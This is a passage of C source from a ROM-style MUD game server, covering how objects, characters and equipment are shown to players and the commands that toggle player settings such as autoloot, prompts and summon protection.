/* WIZZLEHOME */
#if defined(macintosh)  
#include <types.h> 
#else 
#include <sys/types.h> 
#endif 
#include <stdio.h> 
#define _GNU_SOURCE
#include <string.h> 
#include <stdlib.h> 
#include <ctype.h> 
#include <time.h> 
#include "merc.h"  
#include "interp.h"  
#include "magic.h"  
#include "recycle.h"  
#include "tables.h"  
#include "lookup.h" 
#include "dpit.h" 

#include "Utility.h"
#include "StringUtility.h"
#include "ArrayUtility.h"


char *	const	where_name	[] =
{
    "{c<{Bused as light{c>{x     ",
    "{c<{Bworn on finger{c>{x    ",
    "{c<{Bworn on finger{c>{x    ",
    "{c<{Bworn around neck{c>{x  ",
    "{c<{Bworn around neck{c>{x  ",
    "{c<{Bworn on torso{c>{x     ",
    "{c<{Bworn on head{c>{x      ",
    "{c<{Bworn on legs{c{x>      ",
    "{c<{Bworn on feet{c>{x      ",
    "{c<{Bworn on hands{c>{x     ",
    "{c<{Bworn on arms{c{x>      ",
    "{c<{Bworn as shield{c>{x    ",
    "{c<{Bworn about body{c>{x   ",
    "{c<{Bworn about waist{c>{x  ",
    "{c<{Bworn around wrist{c>{x ",
    "{c<{Bworn around wrist{c>{x ",
    "{c<{Bwielded{c>{x           ",
    "{c<{Bheld{c>{x              ",
    "{c<{Bfloating nearby{c>{x   ",
    "{c<{Bsecond wielded{c>{x    ",
    "{c<{Bworn on back{c>{x      "
};


DECLARE_DO_FUN(do_account);

/* for  keeping track of the player count */
int max_on = 0;

/*
 * Local functions.
 */
char *	format_obj_to_char	args( ( OBJ_DATA *obj, CHAR_DATA *ch,
				    bool fShort, bool star ) );
void	show_list_to_char	args( ( OBJ_DATA *list, CHAR_DATA *ch,
				    bool fShort, bool fShowNothing ) );
void	show_char_to_char_0	args( ( CHAR_DATA *victim, CHAR_DATA *ch ) );
void	show_char_to_char_1	args( ( CHAR_DATA *victim, CHAR_DATA *ch ) );
void	show_char_to_char	args( ( CHAR_DATA *list, CHAR_DATA *ch ) );
bool	check_blind		args( ( CHAR_DATA *ch ) );
bool   legal_class		args( ( int race, char * class_name ) );

// Explorer/Killer Percentages
bool valid_explorer_killer(CHAR_DATA *ch);
void do_score_section(CHAR_DATA * ch);


char *format_obj_to_char( OBJ_DATA *obj, CHAR_DATA *ch, bool fShort, bool star )
{
    static char buf[MAX_STRING_LENGTH];
    char ** joins=0;
    char ** ar=0;
    OBJ_INDEX_DATA * joinedWithObj;

    buf[0] = '\0';

    if ((fShort && (obj->short_descr == NULL || obj->short_descr[0] == '\0'))
    ||  (obj->description == NULL || obj->description[0] == '\0'))
	return buf;
        if(star)
        {
        if(obj->level<=(ch->level))
          strcat( buf, "{G*{x ");
        else
        if(obj->level<=(ch->level+1))
          strcat( buf, "{Y*{x ");
        else
        if(obj->level<=(ch->level+2))
          strcat( buf, "{R*{x ");
        }

    if ( IS_OBJ_STAT(obj, ITEM_INVIS)     )   strcat( buf, "{c({DInvis{c){x "     );
    if ( IS_AFFECTED(ch, AFF_DETECT_EVIL)
         && IS_OBJ_STAT(obj, ITEM_EVIL)   )   strcat( buf, "{c({rRed Aura{c){x "  );
    if (IS_AFFECTED(ch, AFF_DETECT_GOOD)
    &&  IS_OBJ_STAT(obj,ITEM_BLESS))	      strcat(buf,"{c({bBlue Aura{c){x "	);
    if ( IS_AFFECTED(ch, AFF_DETECT_MAGIC)
         && IS_OBJ_STAT(obj, ITEM_MAGIC)  )   strcat( buf, "{c({CMagical{c){x "   );
    if ( IS_OBJ_STAT(obj, ITEM_GLOW)      )   strcat( buf, "{c({YGlowing{c){x "   );
    if ( IS_OBJ_STAT(obj, ITEM_HUM)       )   strcat( buf, "{c({BHumming{c){x "   );

    if ( fShort )
    {
	if ( obj->short_descr != NULL )
	    strcat( buf, obj->short_descr );
    }
    else
    {
	if ( obj->description != NULL)
	    strcat( buf, obj->description );
    }
    
    if(GetObjExtraDesc(obj, "=joinedwith=") && (joins=strstrexplode(GetObjExtraDescText(GetObjExtraDesc(obj, "=joinedwith=")), "\n\r")))
    {
        strcat(buf, " {W[Joined with:{x ");
        for(ar=joins;ar && *ar;ar++)
        {
            if(is_number(*ar) && (joinedWithObj=get_obj_index(atoi(*ar))))
            {
                if(ar!=joins)
                    strcat(buf, "{W, {x");
                strcat(buf, joinedWithObj->short_descr);
            }
        }
        strcat(buf, "{W]{x");
    }


/* bug fix - WIZZLE */
    if (strlen(buf)<=0)
     {
      strcat(buf,"\n\r{RThis object has NO Long DESC.  Please send a note to IMPs.{x\n\r");
      }

    return buf;
}


/*
 * Show a list to a character.
 * Can coalesce duplicated items.
 */
void show_list_to_char( OBJ_DATA *list, CHAR_DATA *ch, bool fShort, bool fShowNothing )
{
    char buf[MAX_STRING_LENGTH];
    BUFFER *output;
    char **prgpstrShow;
    int *prgnShow;
    char *pstrShow;
    OBJ_DATA *obj;
    int nShow;
    int iShow;
    int count;
    bool fCombine;

    if ( ch->desc == NULL )
	return;

    /*
     * Alloc space for output lines.
     */
    output = new_buf();

    count = 0;
    for ( obj = list; obj != NULL; obj = obj->next_content )
	count++;
    prgpstrShow	= alloc_mem( count * sizeof(char *) );
    prgnShow    = alloc_mem( count * sizeof(int)    );
    nShow	= 0;

    /*
     * Format the list of objects.
     */
    for ( obj = list; obj != NULL; obj = obj->next_content )
    { 
	if ( obj->wear_loc == WEAR_INVENTORY && can_see_obj( ch, obj )) 
	{
	    pstrShow = format_obj_to_char( obj, ch, fShort,TRUE );

	    fCombine = FALSE;

	    if ( IS_NPC(ch) || IS_SET(ch->comm, COMM_COMBINE) )
	    {
		/*
		 * Look for duplicates, case sensitive.
		 * Matches tend to be near end so run loop backwords.
		 */
		for ( iShow = nShow - 1; iShow >= 0; iShow-- )
		{
		    if ( !strcmp( prgpstrShow[iShow], pstrShow ) )
		    {
			prgnShow[iShow]++;
			fCombine = TRUE;
			break;
		    }
		}
	    }

	    /*
	     * Couldn't combine, or didn't want to.
	     */
	    if ( !fCombine )
	    {
		prgpstrShow [nShow] = str_dup( pstrShow );
		prgnShow    [nShow] = 1;
		nShow++;
	    }
	}
    }

    /*
     * Output the formatted list.
     */
    for ( iShow = 0; iShow < nShow; iShow++ )
    {
	if (prgpstrShow[iShow][0] == '\0')
	{
	    free_string(prgpstrShow[iShow]);
	    continue;
	}

	if ( IS_NPC(ch) || IS_SET(ch->comm, COMM_COMBINE) )
	{
	    if ( prgnShow[iShow] != 1 )
	    {
		sprintf( buf, "(%2d) ", prgnShow[iShow] );
		add_buf(output,buf);
	    }
	    else
	    {
		add_buf(output,"     ");
	    }
	}
	add_buf(output,prgpstrShow[iShow]);
	add_buf(output,"\n\r");
	free_string( prgpstrShow[iShow] );
    }

    if ( fShowNothing && nShow == 0 )
    {
	if ( IS_NPC(ch) || IS_SET(ch->comm, COMM_COMBINE) )
	    send_to_char( "     ", ch );
	send_to_char( "Nothing.\n\r", ch );
    }
    page_to_char(buf_string(output),ch);

    /*
     * Clean up.
     */
    free_buf(output);
    free_mem( prgpstrShow, count * sizeof(char *) );
    free_mem( prgnShow,    count * sizeof(int)    );

    return;
}



void show_char_to_char_0( CHAR_DATA *victim, CHAR_DATA *ch )
{
    char buf[MAX_STRING_LENGTH],message[MAX_STRING_LENGTH];

    buf[0] = '\0';

    if ( IS_SET(victim->comm,COMM_AFK	  )   ) strcat( buf, "{W[{YAFK{W]{x "	 );
    if ( IS_AFFECTED(victim, AFF_INVISIBLE)   ) strcat( buf, "{D(Invis){x "      );
    if ( victim->invis_level >= LEVEL_HERO    ) strcat( buf, "{c({DWizi{c){x "	     );
    if ( IS_AFFECTED(victim, AFF_HIDE)        ) strcat( buf, "{D(Hide){x "       );
    if ( IS_AFFECTED(victim, AFF_CHARM)       ) strcat( buf, "{c({CCharmed{c){x "    );
    if ( IS_AFFECTED(victim, AFF_PASS_DOOR)   ) strcat( buf, "({BTranslucent{x) ");
    if ( IS_AFFECTED(victim, AFF_FAERIE_FIRE) ) strcat( buf, "({MPink Aura{x) "  );
    if ( IS_EVIL(victim)
    &&   IS_AFFECTED(ch, AFF_DETECT_EVIL)     ) strcat( buf, "({rRed Aura{x) "   );
    if ( IS_GOOD(victim)
    &&   IS_AFFECTED(ch, AFF_DETECT_GOOD)     ) strcat( buf, "({dSilver Aura{x) ");
    if ( IS_AFFECTED(victim, AFF_SANCTUARY)   ) strcat( buf, "({WWhite Aura{x) " );
    if (IS_AFFECTED(victim, AFF_GOLDEN)) strcat(buf,"{c({YGolden Aura{c){x ");
    if (IS_NPC(victim) &&ch->questmob > 0 && victim->pIndexData->vnum == ch->questmob)
        strcat( buf, "{G[{RTARGET{G]{x ");
    if ( !IS_NPC(victim) && IS_SET(victim->pact, PLR_THIEF  ) )
	strcat( buf, "{D({rTHIEF{D){x "      );
    if ( !IS_NPC(victim) && IS_SET(victim->comm,COMM_ICON  ) )
	strcat( buf, "{b({WICON{b){x "      );
    if ( !IS_NPC(victim) && victim->pcdata->spouse > 0 )
       strcat ( buf, "{D[{cWED{D]{x "      );
    if ( victim->position == victim->start_pos 
	&& victim->long_descr[0] != '\0' )
    {
	strcat(buf, "{c");
	strcat( buf, victim->long_descr );
	strcat(buf, "{x");
	send_to_char( buf, ch );
	return;
    }

    strcat( buf, PERS( victim, ch ) );
    if ( !IS_NPC(victim) && !IS_SET(ch->comm, COMM_BRIEF) 
    &&   victim->position == POS_STANDING && ch->on == NULL )
	strcat( buf, victim->pcdata->title );

    switch ( victim->position )
    {
    case POS_DEAD:     strcat( buf, "{r is DEAD!!{x" );              break;
    case POS_MORTAL:   strcat( buf, "{G is mortally wounded.{x" );   break;
    case POS_INCAP:    strcat( buf, "{G is incapacitated.{x" );      break;
    case POS_STUNNED:  strcat( buf, "{G is lying here stunned.{x" ); break;
    case POS_SLEEPING: 
	if (victim->on != NULL)
	{
	    if (IS_SET(victim->on->value[2],SLEEP_AT))
  	    {
		sprintf(message," is sleeping at %s.",
		    victim->on->short_descr);
		strcat(buf,message);
	    }
	    else if (IS_SET(victim->on->value[2],SLEEP_ON))
	    {
		sprintf(message," is sleeping on %s.",
		    victim->on->short_descr); 
		strcat(buf,message);
	    }
	    else
	    {
		sprintf(message, " is sleeping in %s.",
		    victim->on->short_descr);
		strcat(buf,message);
	    }
	}
	else 
	    strcat(buf,"{c is sleeping here.{x");
	break;
    case POS_RESTING:  
        if (victim->on != NULL)
	{
            if (IS_SET(victim->on->value[2],REST_AT))
            {
                sprintf(message," is resting at %s.",
                    victim->on->short_descr);
                strcat(buf,message);
            }
            else if (IS_SET(victim->on->value[2],REST_ON))
            {
                sprintf(message," is resting on %s.",
                    victim->on->short_descr);
                strcat(buf,message);
            }
            else 
            {
                sprintf(message, " is resting in %s.",
                    victim->on->short_descr);
                strcat(buf,message);
            }
	}
        else
	    strcat( buf, "{c is resting here.{x" );       
	break;
    case POS_SITTING:  
        if (victim->on != NULL)
        {
            if (IS_SET(victim->on->value[2],SIT_AT))
            {
                sprintf(message," {cis sitting at{x %s.",
                    victim->on->short_descr);
                strcat(buf,message);
            }
            else if (IS_SET(victim->on->value[2],SIT_ON))
            {
                sprintf(message," {Cis sitting on{x %s.",
                    victim->on->short_descr);
                strcat(buf,message);
            }
            else
            {
                sprintf(message, " {cis sitting in{x %s.",
                    victim->on->short_descr);
                strcat(buf,message);
            }
        }
        else
	    strcat(buf, "{c is sitting here.{x");
	break;
    case POS_STANDING: 
	if (victim->on != NULL)
	{
	    if (IS_SET(victim->on->value[2],STAND_AT))
	    {
		sprintf(message," is standing at %s.",
		    victim->on->short_descr);
		strcat(buf,message);
	    }
	    else if (IS_SET(victim->on->value[2],STAND_ON))
	    {
		sprintf(message," is standing on %s.",
		   victim->on->short_descr);
		strcat(buf,message);
	    }
	    else
	    {
		sprintf(message," is standing in %s.",
		    victim->on->short_descr);
		strcat(buf,message);
	    }
	}
	else
	    strcat( buf, "{c is here.{x" );               
	break;
    case POS_FIGHTING:
	strcat( buf, " is here, fighting " );
	if ( victim->fighting == NULL )
	    strcat( buf, "thin air??" );
	else if ( victim->fighting == ch )
	    strcat( buf, "YOU!" );
	else if ( victim->in_room == victim->fighting->in_room )
	{
	    strcat( buf, PERS( victim->fighting, ch ) );
	    strcat( buf, "." );
	}
	else
	    strcat( buf, "someone who left??" );
	break;
    }

    strcat( buf, "\n\r" );
    buf[0] = UPPER(buf[0]);
    send_to_char( buf, ch );
    return;
}



void show_char_to_char_1( CHAR_DATA *victim, CHAR_DATA *ch )
{
    char buf[MAX_STRING_LENGTH];
    OBJ_DATA *obj;
    int iWear;
    int percent;
    bool found;

    if ( can_see( victim, ch ) )
    {
	if (ch == victim)
	    act( "{B$n looks at $mself.{x",ch,NULL,NULL,TO_ROOM);
	else
	{
	    act( "{B$n looks at you.{x", ch, NULL, victim, TO_VICT    );
	    act( "{B$n looks at $N.{x",  ch, NULL, victim, TO_NOTVICT );
	}
    }

    if ( victim->description[0] != '\0' )
    {
	send_to_char( victim->description, ch );
    }
    else
    {
	act( "You see nothing special about $M.", ch, NULL, victim, TO_CHAR );
    }

    if ( victim->max_hit > 0 )
	percent = ( 100 * victim->hit ) / victim->max_hit;
    else
	percent = -1;

    strcpy( buf, PERS(victim, ch) );

    if (percent >= 100) 
	strcat( buf, " is in excellent condition.\n\r");
    else if (percent >= 90) 
	strcat( buf, " has a few scratches.\n\r");
    else if (percent >= 75) 
	strcat( buf," has some small wounds and bruises.\n\r");
    else if (percent >=  50) 
	strcat( buf, " has quite a few wounds.\n\r");
    else if (percent >= 30)
	strcat( buf, " has some big nasty wounds and scratches.\n\r");
    else if (percent >= 15)
	strcat ( buf, " looks pretty hurt.\n\r");
    else if (percent >= 0 )
	strcat (buf, " is in awful condition.\n\r");
    else
	strcat(buf, " is {rbleeding{x to death.\n\r");

    buf[0] = UPPER(buf[0]);
    send_to_char( buf, ch );

    found = FALSE;
    for ( iWear = 0; iWear < MAX_WEAR; iWear++ )
    {
	if ( ( obj = get_eq_char( victim, iWear ) ) != NULL
	&&   can_see_obj( ch, obj ) )
	{
	    if ( !found )
	    {
		send_to_char( "\n\r", ch );
		act( "$N is using:", ch, NULL, victim, TO_CHAR );
		found = TRUE;
	    }
	    send_to_char( where_name[iWear], ch );
	    send_to_char( format_obj_to_char( obj, ch, TRUE, TRUE ), ch );
	    send_to_char( "\n\r", ch );
	}
    }

    if ( victim != ch
    &&   !IS_NPC(ch)
    &&   str_cmp(victim->name, "Venus")
    &&   number_percent( ) < get_skill(ch,gsn_peek))
    {
	send_to_char( "\n\rYou peek at the inventory:\n\r", ch );
	check_improve(ch,gsn_peek,TRUE,4);
	show_list_to_char( victim->carrying, ch, TRUE, TRUE );
    }

    return;
}



void show_char_to_char( CHAR_DATA *list, CHAR_DATA *ch )
{
    CHAR_DATA *rch;

    for ( rch = list; rch != NULL; rch = rch->next_in_room )
    {
	if ( rch == ch )
	    continue;

        if (!is_owner(ch))
          {
	   if ( ch->level < rch->invis_level)
	    continue;
          }

	if ( can_see( ch, rch ) )
	{
	    show_char_to_char_0( rch, ch );
	}
	else if ( room_is_dark( ch->in_room )
	&&        IS_AFFECTED(rch, AFF_INFRARED ) )
	{
	    send_to_char( "You see glowing red eyes watching YOU!\n\r", ch );
	}
    }

    return;
} 



bool check_blind( CHAR_DATA *ch )
{

    if (!IS_NPC(ch) && IS_SET(ch->pact,PLR_HOLYLIGHT))
	return TRUE;

    if ( IS_AFFECTED(ch, AFF_BLIND) )
    { 
	send_to_char( "You can't see a thing!\n\r", ch ); 
	return FALSE; 
    }

    return TRUE;
}

/* changes your scroll */
void do_scroll(CHAR_DATA *ch, char *argument)
{
    char arg[MAX_INPUT_LENGTH];
    char buf[100];
    int lines;

    one_argument(argument,arg);
    
    if (arg[0] == '\0')
    {
	if (ch->lines == 0)
	    send_to_char("You do not page long messages.\n\r",ch);
	else
	{
	    sprintf(buf,"You currently display %d lines per page.\n\r",
		    ch->lines + 2);
	    send_to_char(buf,ch);
	}
	return;
    }

    if (!is_number(arg))
    {
	send_to_char("You must provide a number.\n\r",ch);
	return;
    }

    lines = atoi(arg);

    if (lines == 0)
    {
        send_to_char("Paging disabled.\n\r",ch);
        ch->lines = 0;
        return;
    }

    if (lines < 10 || lines > 100)
    {
	send_to_char("You must provide a reasonable number.\n\r",ch);
	return;
    }

    sprintf(buf,"Scroll set to %d lines.\n\r",lines);
    send_to_char(buf,ch);
    ch->lines = lines - 2;
}

/* RT does socials */
void do_socials(CHAR_DATA *ch, char *argument)
{
    char buf[MAX_STRING_LENGTH];
    int iSocial;
    int col;
    
    send_to_char("\n\r",ch);

    col = 0;
   
    for (iSocial = 0; social_table[iSocial].name[0] != '\0'; iSocial++)
    {
	sprintf(buf,"{c[{W%-11s{c]",social_table[iSocial].name);
	send_to_char(buf,ch);
	if (++col % 6 == 0)
	    send_to_char("{x\n\r",ch);
    }

    if ( col % 6 != 0)
	send_to_char("{m\n\r{x",ch);
    return;
}


 
/* RT Commands to replace news, motd, imotd, etc from ROM */

void do_motd(CHAR_DATA *ch, char *argument)
{
    do_function(ch, &do_help, "motd");
}

void do_rules(CHAR_DATA *ch, char *argument)
{
    do_function(ch, &do_help, "rules");
}

void do_ximm(CHAR_DATA *ch, char *argument)
{
    do_function(ch, &do_help, "bximmlevel");
}

void do_imotd(CHAR_DATA *ch, char *argument)
{  
    do_function(ch, &do_help, "imotd");
}

void do_story(CHAR_DATA *ch, char *argument)
{
    do_function(ch, &do_help, "story");
}

void do_wizlist(CHAR_DATA *ch, char *argument)
{
    do_function(ch, &do_help, "wizlist");
}

void do_wizindex(CHAR_DATA *ch, char *argument)
{
    do_function(ch, &do_help, "wizindex");
}

void do_remortlist(CHAR_DATA *ch, char *argument)
{
    do_function(ch, &do_help, "remortlist");
}


/* RT this following section holds all the auto commands from ROM, as well as
   replacements for config */

void do_pcinfo(CHAR_DATA *ch, char *argument)
{
   char buf[MAX_STRING_LENGTH];

    /* lists most player flags */
    if (IS_NPC(ch))
      return;

    send_to_char("\n\r{cFLAG            STATUS{x\n\r",ch);
    send_to_char("{w------------------------{x\n\r",ch);

    send_to_char("{CAutoAssist      {x",ch);
    if (IS_SET(ch->pact,PLR_AUTOASSIST))
        send_to_char("{gON{x\n\r",ch);
    else
        send_to_char("{rOFF{x\n\r",ch);

    send_to_char("{CAutoExit        {x",ch);
    if (IS_SET(ch->pact,PLR_AUTOEXIT))
        send_to_char("{gON{x\n\r",ch);
    else
        send_to_char("{rOFF{x\n\r",ch);

    send_to_char("{CAutoGold        {x",ch);
    if (IS_SET(ch->pact,PLR_AUTOGOLD))
        send_to_char("{gON{x\n\r",ch);
    else
        send_to_char("{rOFF{x\n\r",ch);

    send_to_char("{CAutoLoot        {x",ch);
    if (IS_SET(ch->pact,PLR_AUTOLOOT))
        send_to_char("{gON{x\n\r",ch);
    else
        send_to_char("{rOFF{x\n\r",ch);

    send_to_char("{CAutoSacrifice   {x",ch);
    if (IS_SET(ch->pact,PLR_AUTOSAC))
        send_to_char("{gON{x\n\r",ch);
    else
        send_to_char("{rOFF{x\n\r",ch);

    send_to_char("{CAutoSplit {YGOLD  {x",ch);
    if (IS_SET(ch->pact,PLR_AUTOSPLIT))
        send_to_char("{gON{x\n\r",ch);
    else
        send_to_char("{rOFF{x\n\r",ch);
    send_to_char("{CCompact Mode    {x",ch);
    if (IS_SET(ch->comm,COMM_COMPACT))
        send_to_char("{gON{x\n\r",ch);
    else
        send_to_char("{rOFF{x\n\r",ch);

    send_to_char("{CPrompt          {x",ch);
    if (IS_SET(ch->comm,COMM_PROMPT))
       send_to_char("{gON{x\n\r",ch);
    else
        send_to_char("{rOFF{x\n\r",ch);

    send_to_char("{CCombine Items   {x",ch);
    if (IS_SET(ch->comm,COMM_COMBINE))
        send_to_char("{gON{x\n\r",ch);
    else
        send_to_char("{rOFF{x\n\r",ch);

    if (!IS_NPC(ch))
      {
    if (IS_SET(ch->comm, COMM_COMBAT))
        send_to_char("{CCOMBAT Info     {gON{x\n\r",ch);
      else
        send_to_char("{CCOMBAT Info     {rOFF{x\n\r",ch);
      }

    send_to_char("{CQuiet Mode{x      ",ch);
    if (IS_SET(ch->comm,COMM_QUIET))
      send_to_char("{gON{x\n\r",ch);
    else
      send_to_char("{rOFF{x\n\r",ch);

    send_to_char("{w---------------------------------------{x\n\r",ch);


    if (ch->lines != PAGELEN)
    {
        if (ch->lines)
        {
            sprintf(buf,"{cYou display {W%d{c lines of scroll.{x\n\r",ch->lines+2);
            send_to_char(buf,ch);
        }
        else
            send_to_char("{cScroll Buffering {rOFF{x\n\r",ch);
    }


    if (IS_SET(ch->comm,COMM_SNOOP_PROOF))
        send_to_char("{cYou are {WIMMUNE{c to snooping.{x\n\r",ch);
        

    if (!IS_SET(ch->pact,PLR_CANLOOT))
        send_to_char("{cYour corpse is {WSAFE {cfrom looting.{x\n\r",ch);
    else
        send_to_char("{cYour corpse {WMAY BE {clooted.{x\n\r",ch);

    if (IS_SET(ch->pact,PLR_NOSUMMON))
        send_to_char("{cYou {WCAN NOT {cbe summoned.{x\n\r",ch);
    else
        send_to_char("{cYou {WCAN BE{c summoned.{x\n\r",ch);

    if (IS_SET(ch->pact,PLR_NOFOLLOW))
        send_to_char("{cYou {WCAN NOT{c have followers.{x\n\r",ch);
    else
        send_to_char("{cYou {WCAN {chave followers.{x\n\r",ch);

    if (IS_SET(ch->comm,COMM_CLANSHOW))
        send_to_char("{cYour CLAN AFFILIATION {WIS {cshown on WHO{x\n\r",ch);
    else
        send_to_char("{cYour CLAN AFFILIATION {WIS NOT{c shown on WHO{x\n\r",ch);

    if (IS_SET(ch->pact,PLR_NORESTORE))
        send_to_char("{cYou {WWILL NOT {caccept IMM/IMP RESTOREs.{x\n\r",ch);
    else
        send_to_char("{cYou {WWILL{c accept IMM/IMP RESTOREs.{x\n\r",ch);

    if (IS_SET(ch->comm,COMM_AFK))
        send_to_char("{cYou are {RAFK{W.{x  \n\r",ch);

    if (ch->prompt != NULL)
    {
      sprintf(buf,"\n\r{cYour current prompt is{W:{x %s{x\n\r",ch->prompt);
      send_to_char(buf,ch);
    }

    if (IS_SET(ch->comm,COMM_NOTELL))
      send_to_char("You cannot use tell.\n\r",ch);

    if (IS_SET(ch->comm,COMM_NOCHANNELS))
     send_to_char("You cannot use channels.\n\r",ch);

    if (IS_SET(ch->comm,COMM_NOEMOTE))
      send_to_char("You cannot show emotions.\n\r",ch);
  
    if (IS_SET(ch->comm,COMM_DPITKILL))
      send_to_char("\n\r{RYou are unable to use DPTALK or DRAGONPIT while your DragonPIT Privlages are revoked..{x\n\r",ch);

}


void do_autoassist(CHAR_DATA *ch, char *argument)
{
    if (IS_NPC(ch))
      return;
    
    if (IS_SET(ch->pact,PLR_AUTOASSIST))
    {
      send_to_char("{rAutoassist removed.{x\n\r",ch);
      REMOVE_BIT(ch->pact,PLR_AUTOASSIST);
    }
    else
    {
      send_to_char("{gYou will now assist when needed.{x\n\r",ch);
      SET_BIT(ch->pact,PLR_AUTOASSIST);
    }
}

void do_autoexit(CHAR_DATA *ch, char *argument)
{
    if (IS_NPC(ch))
      return;
 
    if (IS_SET(ch->pact,PLR_AUTOEXIT))
    {
      send_to_char("{rExits will no longer be displayed.{x\n\r",ch);
      REMOVE_BIT(ch->pact,PLR_AUTOEXIT);
    }
    else
    {
      send_to_char("{gExits will now be displayed.{x\n\r",ch);
      SET_BIT(ch->pact,PLR_AUTOEXIT);
    }
}

void do_autogold(CHAR_DATA *ch, char *argument)
{
    if (IS_NPC(ch))
      return;
 
    if (IS_SET(ch->pact,PLR_AUTOGOLD))
    {
      send_to_char("{rAutogold removed.{x\n\r",ch);
      REMOVE_BIT(ch->pact,PLR_AUTOGOLD);
    }
    else
    {
      send_to_char("{gAutomatic gold looting set.{x\n\r",ch);
      SET_BIT(ch->pact,PLR_AUTOGOLD);
    }
}

void do_autoloot(CHAR_DATA *ch, char *argument)
{
    if (IS_NPC(ch))
      return;
 
    if (IS_SET(ch->pact,PLR_AUTOLOOT))
    {
      send_to_char("{rAutolooting removed.{x\n\r",ch);
      REMOVE_BIT(ch->pact,PLR_AUTOLOOT);
    }
    else
    {
      send_to_char("{gAutomatic corpse looting set.{x\n\r",ch);
      SET_BIT(ch->pact,PLR_AUTOLOOT);
    }
}

void do_autosac(CHAR_DATA *ch, char *argument)
{
    if (IS_NPC(ch))
      return;
 
    if (IS_SET(ch->pact,PLR_AUTOSAC))
    {
      send_to_char("{rAutosacrificing removed.{x\n\r",ch);
      REMOVE_BIT(ch->pact,PLR_AUTOSAC);
    }
    else
    {
      send_to_char("{gAutomatic corpse sacrificing set.{x\n\r",ch);
      SET_BIT(ch->pact,PLR_AUTOSAC);
    }
}

void do_autosplit(CHAR_DATA *ch, char *argument)
{
    if (IS_NPC(ch))
      return;
 
    if (IS_SET(ch->pact,PLR_AUTOSPLIT))
    {
      send_to_char("{rAutosplitting removed.{x\n\r",ch);
      REMOVE_BIT(ch->pact,PLR_AUTOSPLIT);
    }
    else
    {
      send_to_char("{gAutomatic gold splitting set.{x\n\r",ch);
      SET_BIT(ch->pact,PLR_AUTOSPLIT);
    }
}

void do_brief(CHAR_DATA *ch, char *argument)
{
    if (IS_SET(ch->comm,COMM_BRIEF))
    {
      send_to_char("Full descriptions activated.\n\r",ch);
      REMOVE_BIT(ch->comm,COMM_BRIEF);
    }
    else
    {
      send_to_char("Short descriptions activated.\n\r",ch);
      SET_BIT(ch->comm,COMM_BRIEF);
    }
}

void do_compact(CHAR_DATA *ch, char *argument)
{
    if (IS_SET(ch->comm,COMM_COMPACT))
    {
      send_to_char("{rCompact mode removed.{x\n\r",ch);
      REMOVE_BIT(ch->comm,COMM_COMPACT);
    }
    else
    {
      send_to_char("{gCompact mode set.{x\n\r",ch);
      SET_BIT(ch->comm,COMM_COMPACT);
    }
}

void do_show(CHAR_DATA *ch, char *argument)
{
    if (IS_SET(ch->comm,COMM_SHOW_AFFECTS))
    {
      send_to_char("{rAffects will no longer be shown in score.{x\n\r",ch);
      REMOVE_BIT(ch->comm,COMM_SHOW_AFFECTS);
    }
    else
    {
      send_to_char("{gAffects will now be shown in score.{x\n\r",ch);
      SET_BIT(ch->comm,COMM_SHOW_AFFECTS);
    }
}

void do_bankshow(CHAR_DATA *ch, char *argument)
{
    if (IS_SET(ch->comm,COMM_SHOW_ACCOUNT))
    {
      send_to_char("\n\r{RACCOUNT Information will NO longer be shown in SCORE.{x\n\r",ch);
      REMOVE_BIT(ch->comm,COMM_SHOW_ACCOUNT);
    }
    else
    {
      send_to_char("\n\r{GACCOUNT Information will NOW be shown in SCORE.{x\n\r",ch);
      SET_BIT(ch->comm,COMM_SHOW_ACCOUNT);
    }
}


void do_prompt(CHAR_DATA *ch, char *argument)
{
   char buf[MAX_STRING_LENGTH];
 
   if ( argument[0] == '\0' )
   {
	if (IS_SET(ch->comm,COMM_PROMPT))
   	{
      	    send_to_char("\n\r{rYou will no longer see prompts.{x\n\r",ch);
      	    REMOVE_BIT(ch->comm,COMM_PROMPT);
    	}
    	else
    	{
      	    send_to_char("\n\r{gYou will now see prompts.{x\n\r",ch);
      	    SET_BIT(ch->comm,COMM_PROMPT);
    	}
       return;
   }
 
   if( !strcmp( argument, "all" ) )
      strcpy( buf, "{c< {rHP{w: %h  {MMana{w: %m  {gMove{w: %v  {BTNL{w: {C%X {c>{x  %K{W:%c{x " );
   else if(!strcmp(argument, "imm") && IS_IMMORTAL(ch))
	strcpy(buf, "{C<{R%z{y [Room %R]{C>{x " );
   else
   {
      if ( strlen(argument) > 50 )
         argument[50] = '\0';
      strcpy( buf, argument );
      smash_tilde( buf );
      if (str_suffix("%c",buf))
	strcat(buf," ");
	
   }
 
   free_string( ch->prompt );
   ch->prompt = str_dup( buf );
   sprintf(buf,"Prompt set to %s\n\r",ch->prompt );
   send_to_char(buf,ch);
   return;
}

void do_combine(CHAR_DATA *ch, char *argument)
{
    if (IS_SET(ch->comm,COMM_COMBINE))
    {
      send_to_char("Long inventory selected.\n\r",ch);
      REMOVE_BIT(ch->comm,COMM_COMBINE);
    }
    else
    {
      send_to_char("Combined inventory selected.\n\r",ch);
      SET_BIT(ch->comm,COMM_COMBINE);
    }
}

void do_noloot(CHAR_DATA *ch, char *argument)
{
    if (IS_NPC(ch))
      return;
 
    if (IS_SET(ch->pact,PLR_CANLOOT))
    {
      send_to_char("{gYour corpse is now safe from thieves.{x\n\r",ch);
      REMOVE_BIT(ch->pact,PLR_CANLOOT);
    }
    else
    {
      send_to_char("{rYour corpse may now be looted.{x\n\r",ch);
      SET_BIT(ch->pact,PLR_CANLOOT);
    }
}

void do_nofollow(CHAR_DATA *ch, char *argument)
{
    if (IS_NPC(ch))
      return;
 
    if (IS_SET(ch->pact,PLR_NOFOLLOW))
    {
      send_to_char("You now accept followers.{x\n\r",ch);
      REMOVE_BIT(ch->pact,PLR_NOFOLLOW);
    }
    else
    {
      send_to_char("You no longer accept followers.{x\n\r",ch);
      SET_BIT(ch->pact,PLR_NOFOLLOW);
      die_follower( ch );
    }
}

void do_norestore(CHAR_DATA *ch, char *argument)
{
    if (IS_NPC(ch))
      return;
 
    if (IS_SET(ch->pact,PLR_NORESTORE))
    {
      send_to_char("\n\r{GYou now accept IMM/IMP RESTOREs.{x\n\r",ch);
      REMOVE_BIT(ch->pact,PLR_NORESTORE);
    }
    else
    {
      send_to_char("\n\r{RYou no longer accept IMM/IMP RESTOREs.{x\n\r",ch);
      SET_BIT(ch->pact,PLR_NORESTORE);
    }
 return;
}

void do_nosummon(CHAR_DATA *ch, char *argument)
{
    if (IS_NPC(ch))
    {
      if (IS_SET(ch->imm_flags,IMM_SUMMON))
      {
	send_to_char("\n\r{WYou are no longer immune to summon.{x\n\r",ch);
